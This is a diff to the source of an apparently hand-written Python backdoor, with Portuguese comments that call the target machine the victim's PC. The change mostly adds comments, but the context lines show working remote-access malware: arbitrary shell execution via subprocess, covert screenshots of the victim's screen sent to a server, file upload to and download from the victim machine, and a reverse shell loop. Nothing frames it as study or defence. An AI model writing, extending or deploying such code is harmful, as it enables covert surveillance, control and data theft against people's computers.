@@ -11,7 +11,7 @@ import subprocess
 import tempfile
 import random
 import threading
-if(os.name == 'posix'):
+if(os.name == 'posix'): # try import propely screenshot module
     try:
         import pyscreenshot
     except ImportError:
@@ -23,7 +23,7 @@ elif(os.name == 'nt'):
         pass
 
 
-nome_arquivo='backdoor.exe'
+nome_arquivo='backdoor.exe' # name of file after compiled
 TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será salvo o backdoor
 
 ''' COMPILAR O BACKDOOR
@@ -42,9 +42,11 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
  Backdoor complete (Only when all features ready).
 '''
 
-def run(comando): # funcão que vai ser executada por uma thread
+# funcão que vai ser executada por uma thread
+def run(comando):
     comando = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
+# método que executa um programa em uma nova thread
 def run_program(s , nome_programa):
     if(os.path.isfile(nome_programa)):
         sistema = os.name
@@ -69,16 +71,17 @@ def run_program(s , nome_programa):
     else: # arquivo não existe
         s.send('1')
 
-
+# metodo que tira screenshot do PC da vitma
 def screenshot(s):
     nome = TEMPDIR + '/screenshot'+str(random.randint(0,1000000)) + '.png'
-    if(os.name == 'posix'):
+    if(os.name == 'posix'): # se for unix-like
         img = pyscreenshot.grab()
         img.save(nome)
-    elif(os.name == 'nt'):
+    elif(os.name == 'nt'): # se for windows
         img = ImageGrab.grab()
         img.save(nome)
-        
+
+    # envia para o servidor
     f = open(nome ,'rb')
     l = f.read(1024)
     l = nome + '+/-' + l
@@ -90,6 +93,7 @@ def screenshot(s):
     s.shutdown(socket.SHUT_WR)
     os.remove(nome)
 
+# recebe arquivos do servidor e salva no PC da vitma
 def upload(s):
     l = s.recv(1024)
     nome_arquivo = l.split('+/-')[0]
@@ -103,6 +107,7 @@ def upload(s):
         l = s.recv(1024)
     f.close()
 
+ # shell reversa
 def shell(s):
     while True:
         dados = s.recv(1024)
@@ -129,7 +134,7 @@ def shell(s):
                     s.send('feito')
                 else:
                     s.send(retorno)
-
+# servidor baixa um arquivo do PC da vitma
 def download(s):
     arquivo = s.recv(1024)
     print(arquivo)
